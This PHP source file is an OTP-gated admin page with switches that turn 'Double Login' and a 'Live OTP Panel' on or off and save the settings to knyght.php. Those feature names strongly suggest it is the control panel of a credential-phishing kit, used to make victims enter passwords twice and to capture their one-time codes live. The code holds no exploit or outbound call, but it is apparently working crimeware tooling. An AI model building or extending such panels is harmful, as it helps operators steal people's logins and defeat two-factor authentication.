<?php
session_start();
ini_set('display_errors', 1);


// Check if user has passed OTP verification
if (!isset($_SESSION['otp_verified']) || $_SESSION['otp_verified'] !== true) {
    // Redirect user to login page
    header("Location: ../../dashboard/login.php");
    exit;
}
?><?php
// Include the knyght.php file to get the values of $DL and $SMS1
include "knyght.php"; // Replace with the actual path

// Define the variables with default values if they are not set
if (!isset($DL)) {
    $DL = 'OFF'; // Set the default value for DL
}

if (!isset($SMS1)) {
    $SMS1 = 'OFF'; // Set the default value for SMS1
}




// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if DL checkbox is checked
    if (isset($_POST['enableDL']) && $_POST['enableDL'] == 'on') {
        $DL = 'ON';
    } else {
        $DL = 'OFF';
    }

    // Check if SMS1 checkbox is checked
    if (isset($_POST['enableSMS1']) && $_POST['enableSMS1'] == 'on') {
        $SMS1 = 'ON';
    } else {
        $SMS1 = 'OFF';
    }
 

	
    // Save the updated values to knyght.php
    $content = "<?php\n";
    $content .= "\$DL = '$DL';\n";
    $content .= "\$SMS1 = '$SMS1';\n";


    $content .= "?>";

    file_put_contents("knyght.php", $content); // Replace with the actual path
}
?>

<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Toggle Functions</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        h1 {
            color: #00ff00;
            margin-top: 20px;
        }

        form {
            background-color: #222;
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            width: 300px;
            margin: 0 auto;
        }

        label {
            color: #00ff00;
            display: block;
            margin-bottom: 10px;
        }

        .switch {
            position: relative;
            display: inline-block;
            width: 60px;
            height: 34px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #333; /* Dark matte green */
            -webkit-transition: .4s;
            transition: .4s;
            border-radius: 34px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 26px;
            width: 26px;
            left: 4px;
            bottom: 4px;
            background-color: #00ff00; /* Matte green accent color */
            -webkit-transition: .4s;
            transition: .4s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background-color: #333; /* Dark matte green */
        }

        input:focus + .slider {
            box-shadow: 0 0 1px #00ff00; /* Matte green accent color */
        }

        input:checked + .slider:before {
            -webkit-transform: translateX(26px);
            -ms-transform: translateX(26px);
            transform: translateX(26px);
        }

        .slider.round {
            border-radius: 34px;
        }

        .slider.round:before {
            border-radius: 50%;
        }

        input[type="submit"] {
            background-color: #00ff00; /* Matte green accent color */
            color: #000;
            border: none;
            padding: 12px 20px;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
            margin-top: 20px;
        }

        input[type="submit"]:hover {
            background-color: #009900; /* Darker matte green on hover */
        }

        .redirect-button {
            background-color: #333; /* Dark matte green */
            color: #00ff00; /* Matte green accent color */
            border: none;
            padding: 12px 20px;
            cursor: pointer;
            border-radius: 5px;
            width: 100%;
            margin-top: 20px;
            text-decoration: none;
            display: inline-block;
        }

        .redirect-button:hover {
            background-color: #009900; /* Darker matte green on hover */
        }
    </style>
</head>
<body>
    <h1>Command Functions On/Off</h1>
    <?php
    if (isset($_GET['success']) && $_GET['success'] == 1) {
        echo '<p>Settings updated successfully!</p>';
    }
    ?>
    <form method="post" action="toggle_functions.php">
	
        <label for="enableDL"> Double Login :</label>
        <label class="switch">
            <input type="checkbox" id="enableDL" name="enableDL" <?php echo $DL === 'ON' ? 'checked' : ''; ?>>
            <span class="slider round"></span>
        </label>

        <label for="enableSMS1"> Live OTP Panel :</label>
        <label class="switch">
            <input type="checkbox" id="enableSMS1" name="enableSMS1" <?php echo $SMS1 === 'ON' ? 'checked' : ''; ?>>
            <span class="slider round"></span>
        </label>

        <input type="submit" value="Save">
      
    </form>
    <a href="../../dashboard/" class="redirect-button">Go to Dashboard</a>
</body>
</html>

